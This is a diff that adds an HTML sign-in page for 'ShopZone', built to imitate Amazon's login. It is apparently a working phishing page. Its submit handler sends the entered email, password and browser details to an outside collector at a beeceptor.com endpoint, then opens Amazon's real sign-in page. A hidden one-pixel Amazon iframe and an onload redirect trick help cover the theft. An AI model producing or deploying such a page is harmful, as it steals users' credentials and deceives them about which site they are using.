@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - ShopZone</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Amazon Ember", Arial, sans-serif;
+            background: #f7f8f8;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        #blackdiv {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.02);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .login-container {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 20px 26px;
+            max-width: 350px;
+            width: 100%;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 2;
+        }
+
+        .shopzone-logo {
+            text-align: center;
+            margin-bottom: 18px;
+        }
+
+        .shopzone-logo img {
+            width: 103px;
+            height: 31px;
+        }
+
+        .shopzone-logo-text {
+            font-size: 28px;
+            font-weight: normal;
+            color: #232f3e;
+            text-decoration: none;
+            position: relative;
+        }
+
+        .shopzone-logo-text::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            right: 0;
+            width: 20px;
+            height: 3px;
+            background: #ff9900;
+            border-radius: 2px;
+        }
+
+        .login-header {
+            margin-bottom: 18px;
+        }
+
+        .login-header h1 {
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 1.2;
+            color: #0f1111;
+            margin-bottom: 2px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 2px;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 31px;
+            padding: 3px 7px;
+            font-size: 13px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.5), 0 1px 0 rgba(0,0,0,0.07) inset;
+            outline: 0;
+            font-family: inherit;
+        }
+
+        .form-group input:focus {
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228,121,17,0.5), 0 1px 0 rgba(255,255,255,0.5), 0 1px 0 rgba(0,0,0,0.07) inset;
+        }
+
+        .show-password {
+            font-size: 11px;
+            margin-top: 8px;
+        }
+
+        .show-password input {
+            width: auto;
+            height: auto;
+            margin-right: 5px;
+        }
+
+        .show-password label {
+            font-weight: normal;
+            color: #111;
+            cursor: pointer;
+        }
+
+        .continue-btn {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset;
+            color: #111;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 13px;
+            font-weight: 400;
+            line-height: 29px;
+            padding: 0 10px 0 11px;
+            text-align: center;
+            text-decoration: none;
+            width: 100%;
+            margin-bottom: 14px;
+            height: 29px;
+            font-family: inherit;
+        }
+
+        .continue-btn:hover {
+            background: linear-gradient(to bottom, #f5d78e, #eeb933);
+            border-color: #9c7e31;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset;
+        }
+
+        .continue-btn:active {
+            background: linear-gradient(to bottom, #eeb933, #f0c14b);
+            box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset, 0 1px 0 rgba(0,0,0,0.1);
+        }
+
+        .continue-btn:disabled {
+            background: #f7f7f7;
+            border-color: #ddd;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .legal-text {
+            font-size: 11px;
+            color: #111;
+            line-height: 14px;
+            margin-bottom: 14px;
+        }
+
+        .legal-text a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+
+        .legal-text a:hover {
+            text-decoration: underline;
+            color: #c45500;
+        }
+
+        .divider {
+            background: linear-gradient(to right, transparent, #e7e7e7, transparent);
+            height: 1px;
+            margin: 20px -26px 14px;
+            position: relative;
+        }
+
+        .divider::after {
+            content: "New to ShopZone?";
+            background: white;
+            color: #767676;
+            font-size: 12px;
+            padding: 0 8px;
+            position: absolute;
+            left: 50%;
+            top: -6px;
+            transform: translateX(-50%);
+        }
+
+        .create-account-btn {
+            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+            border: 1px solid #adb1b8;
+            border-radius: 3px;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.6) inset;
+            color: #111;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 13px;
+            font-weight: 400;
+            line-height: 29px;
+            padding: 0 10px 0 11px;
+            text-align: center;
+            text-decoration: none;
+            width: 100%;
+            height: 29px;
+            font-family: inherit;
+        }
+
+        .create-account-btn:hover {
+            background: linear-gradient(to bottom, #e7e9ec, #dde0e6);
+            border-color: #9ca1a6;
+        }
+
+        .footer-links {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 11px;
+            line-height: 14px;
+        }
+
+        .footer-links a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #c45500;
+        }
+
+        .error-message {
+            background: #fdf2f2;
+            border: 1px solid #e77600;
+            border-radius: 3px;
+            padding: 8px;
+            margin-bottom: 14px;
+            font-size: 13px;
+            color: #c40000;
+            display: none;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #ff9900;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 14px 18px;
+                margin: 0 14px;
+            }
+
+            .shopzone-logo-text {
+                font-size: 24px;
+            }
+
+            .login-header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="blackdiv"></div>
+
+    <div class="login-container">
+        <div class="shopzone-logo">
+            <div class="shopzone-logo-text">shopzone</div>
+        </div>
+
+        <div class="login-header">
+            <h1>Sign in</h1>
+        </div>
+
+        <div class="error-message" id="errorMessage">
+            We cannot find an account with that email address
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email or mobile phone number</label>
+                <input type="text" id="email" name="email" required autocomplete="username">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+
+            <div class="show-password">
+                <input type="checkbox" id="showPassword">
+                <label for="showPassword">Show password</label>
+            </div>
+
+            <button type="submit" class="continue-btn" id="continueBtn">
+                Continue
+            </button>
+
+            <div class="loading-spinner" id="loadingSpinner"></div>
+        </form>
+
+        <div class="legal-text">
+            By continuing, you agree to ShopZone's <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+        </div>
+
+        <div class="divider"></div>
+
+        <button class="create-account-btn" onclick="showCreateAccount()">
+            Create your account
+        </button>
+
+        <div class="footer-links">
+            <a href="#">Terms of Service</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Support</a>
+        </div>
+    </div>
+
+    <!-- iframe do Amazon (mesmo domínio que o popup) -->
+    <iframe src="https://www.amazon.com/gp/aw/s/ref=is_s?k=fonts.css/$%5E%&*" onload="switcher()" name="amazonloginpopup" style="opacity: 0.01;" width=1 height=1></iframe>
+
+    <script type="text/javascript">
+        let iframeLoaded = false;
+        let loginWindow;
+
+        var loadedOnce = false;
+        var launched = false;
+
+        function switcher() {
+            console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched);
+            if (!loadedOnce) {
+                loadedOnce = true;
+                console.log('First time loading iframe');
+            } else {
+                if (launched) {
+                    console.log('Second time + launched = true, redirecting...');
+                    top.focus();
+                    top.location = "https://www.amazon.com/";
+                }
+            }
+        }
+
+        function launch() {
+            launched = true;
+            console.log('Opening ShopZone...');
+            loginWindow = window.open("https://www.amazon.com/ap/signin", "login");
+        }
+
+        // Show password toggle
+        document.getElementById('showPassword').addEventListener('change', function() {
+            const passwordField = document.getElementById('password');
+            passwordField.type = this.checked ? 'text' : 'password';
+        });
+
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('continueBtn');
+            const spinner = document.getElementById('loadingSpinner');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Hide error message
+            errorMessage.style.display = 'none';
+            
+            // Show loading state
+            btn.style.display = 'none';
+            spinner.style.display = 'block';
+            
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: 'shopzone-login'
+            };
+
+            try {
+                // Send POST request to beeceptor
+                const response = await fetch('https://amazon-login-api.free.beeceptor.com/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                // Simulate processing time
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                if (response.ok) {
+                    // Success - trigger the original behavior
+                    btn.innerHTML = 'Signing in...';
+                    btn.style.display = 'block';
+                    spinner.style.display = 'none';
+                    btn.disabled = true;
+                    
+                    // Trigger the launch function to maintain original behavior
+                    setTimeout(() => {
+                        launch();
+                    }, 1000);
+                } else {
+                    throw new Error('Login failed');
+                }
+            } catch (error) {
+                // Show error and reset form
+                spinner.style.display = 'none';
+                btn.style.display = 'block';
+                btn.disabled = false;
+                
+                errorMessage.style.display = 'block';
+                console.error('Login error:', error);
+                
+                // Clear password field on error
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            }
+        });
+
+        function showCreateAccount() {
+            alert('Create Account functionality would redirect to ShopZone registration page.');
+        }
+
+        // Auto-focus email field
+        window.addEventListener('load', function() {
+            document.getElementById('email').focus();
+        });
+    </script>
+
+</body>
+</html>
